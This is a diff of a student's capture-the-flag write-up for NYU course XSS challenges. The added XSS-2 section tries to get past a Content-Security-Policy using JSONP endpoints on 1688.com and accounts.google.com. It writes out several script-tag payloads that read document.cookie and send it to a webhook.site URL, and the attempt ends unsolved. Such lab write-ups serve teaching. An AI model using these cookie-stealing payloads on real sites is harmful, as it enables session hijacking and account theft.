@@ -89,7 +89,7 @@ http://offsec-chalbroker.osiris.cyber.nyu.edu:10003
 ![img.png](admin_bot.png)
 ![img.png](website_name.png)
 
-This was pretty interesting to figure out. I'll admin, it took me a while to see how to leak the flag, but I finally got it. I had all the right tools, just not using them properly.
+This was pretty interesting to figure out. I'll admit, it took me a while to see how to leak the flag, but I finally got it. I had all the right tools, just not using them properly.
 
 The idea here is that the admin page would hit a website you gave it. Originally, I was sending it to a webhook page I had created, but the was giving me nothing. Then I used the following payload in the main challenge page for the name:
 
@@ -123,3 +123,59 @@ A little URL decoding using CyberChef and I got:
 ````python
 flag=flag{S33_XSS_1snt_s0_h4rd_1s_1t?_3ac8e9cd93202178}
 ````
+## Challenge - XSS-2
+```
+Again, Get admin's cookie
+
+admin bot:
+
+http://offsec-chalbroker.osiris.cyber.nyu.edu:1510
+
+website:
+
+http://offsec-chalbroker.osiris.cyber.nyu.edu:10002
+```
+
+Admin bot:
+
+![img.png](xss2_admin_bot.png)
+
+Challenge site:
+
+![img.png](xss2_main_page.png)
+
+On the surface, this appears to be similar to the XSS-1 challenge. My initial thought is that I will have to navigate around some CSP. Lets send a name over and see what happens.
+
+So in the response page I found:
+
+```python
+Content-Security-Policy: default-src 'self'; script-src 'self' https://*.google.com;
+```
+
+Exactly what I suspected. So the plan of attack will be slightly different. I attempted to solve this challenge by using JSONP to construct my JS payload. I first attempted to go against the recitation, to test my payloads. For testing I added a cookie called "flag" = "winner"
+
+```
+<script src="https://bebezoo.1688.com/fragment/index.htm?callback=alert(document.cookie)"></script>
+```
+
+With this, I was able to pop an alert on my screen. However, when I went to push the script that calls my webhook, I ran into issues:
+```
+<script src="https://bebezoo.1688.com/fragment/index.htm?callback=var%20xhr=new%20XMLHttpRequest();xhr.open('GET','https://webhook.site/bf88a9f7-174c-4b1e-8c6e-cc8f35f5ca5b/'+document.cookie,false);xhr.send();"></script>
+```
+The first was that the '+' used to grap the document.cookie was mangling the url request, so I had to replace it with '%2B':
+```
+<script src="https://bebezoo.1688.com/fragment/index.htm?callback=var%20xhr=new%20XMLHttpRequest();xhr.open('GET','https://webhook.site/bf88a9f7-174c-4b1e-8c6e-cc8f35f5ca5b/'%2bdocument.cookie,false);xhr.send();"></script>
+```
+This worked but never sent the cookie to the webhook server. I tried sending my payload using the google.com JSONP:
+
+```
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=var%20xhr%3dnew%20XMLHttpRequest();xhr.open('GET','https://webhook.site/bf88a9f7-174c-4b1e-8c6e-cc8f35f5ca5b/'%2Bdocument.cookie,false);xhr.send();"></script>
+```
+And that grabbed the cookie, but got rejected calling my webhook:
+
+```
+revoke?callback=var%20xhr%3dnew%20XMLHttpRequest();xhr.open(%27GET%27,%27https://webhook.site/bf88a9f7-174c-4b1e-8c6e-cc8f35f5ca5b/%27%2Bdocument.cookie,false);xhr.send();:2 Refused to connect to 'https://webhook.site/bf88a9f7-174c-4b1e-8c6e-cc8f35f5ca5b/flag=winner' because it violates the following Content Security Policy directive: "default-src 'self'". Note that 'connect-src' was not explicitly set, so 'default-src' is used as a fallback.
+```
+I tried sever attempts to get this to work, but I must have been going down the wrong path.
+
+Punting on this one.
